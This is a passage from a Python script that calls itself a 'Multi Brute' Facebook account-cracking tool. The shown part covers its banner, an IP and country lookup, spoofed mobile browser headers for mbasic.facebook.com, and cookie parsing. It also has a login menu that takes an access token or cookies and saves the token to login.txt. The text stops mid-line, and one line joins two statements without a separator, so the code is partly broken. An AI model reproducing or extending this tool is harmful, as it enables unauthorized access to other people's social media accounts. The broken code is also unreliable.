#!/usr/bin/python3

#-*-coding:utf-8-*-

# Made With ❤️ By Dapunta

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json

from random import randint

from concurrent.futures import ThreadPoolExecutor as ThreadPool

from datetime import date

from datetime import datetime

current = datetime.now()

p = "\x1b[0;37m" # putih

m = "\x1b[0;31m" # merah

h = "\x1b[0;32m" # hijau

k = "\x1b[0;33m" # kuning

b = "\x1b[0;34m" # biru

u = "\x1b[0;35m" # ungu

o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"

        G = "\033[1;92m"

        O = "\033[1;97m"

        R = "\033[1;91m"

else:

        N = ""

        G = ""

        O = ""

        R = ""

### HEADERS ###

def banner():

    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_)   │\n     script by IKHLASO  BUNERY  /  ^ \/ / // /  ^ \   │   / ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"

ips=None

try:

	b=requests.get("http://ip-api.com/json/").json()["query"]	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()

except:

	ips=None

ok = []

cp = []

ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))

tahun = current.year

bulan = current.month

hari = current.day

def jalan(z):

	for e in z + "\n":

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.03)

def clear():

	if " linux" in sys.platform.lower():

		os.system("clear")

	elif "win" in sys.platform.lower():

		os.system("cls")

	else:os.system("clear")

    

def lang(cookies):

	f=False

	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")

	for i in rr.find_all("a",href=True):

		if "id_ID" in i.get("href"):

			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())

			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	

			if "apa yang anda pikirkan sekarang" in b.lower():

				f=True

	if f==True:

		return True

	else:

		exit("[!] Wrong Cookies")

def basecookie():

	if os.path.exists(".cok"):

		if os.path.getsize(".cok") !=0:

			return gets_dict_cookies(open('.cok').read().strip())

		else:logs()

	else:logs()

def hdcok():

	global host

	hosts=host

	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}

	return r

def gets_cookies(cookies):

	result=[]

	for i in enumerate(cookies.keys()):

		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])

		else:result.append(i[1]+"="+cookies[i[1]]+"; ")

	return "".join(result)

def gets_dict_cookies(cookies):

	result={}

	try:

		for i in cookies.split(";"):

			result.update({i.split("=")[0]:i.split("=")[1]})

		return result

	except:

		for i in cookies.split("; "):

			result.update({i.split("=")[0]:i.split("=")[1]})

		return result

### LOGIN METHODE ###

def logs():

  os.system("clear")

  banner()

  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))

  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))

  print((k+"["+p+"0"+k+"]"+p+" Exit"))

  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")

  if sek=="":

    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

    logs()

  elif sek=="1":

    defaultua()

    log_token()

  elif sek=="2":

    defaultua()

    gen()

  elif sek=="0":

    exit()

  else:

    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

    logs()

def log_token():

    os.system("clear")

    banner()

    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")

    try:

        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)

        a = json.loads(otw.text)

        nama = a["name"]

        zedd = open("login.txt", "w")

        zedd.write(toket)

        zedd.close()

        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))

        bot_follow()

    except KeyError:

        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))

        os.system("clear")

        logs()

def gen():

        os.system("clear")

        banner()

        cookie = input(k+"
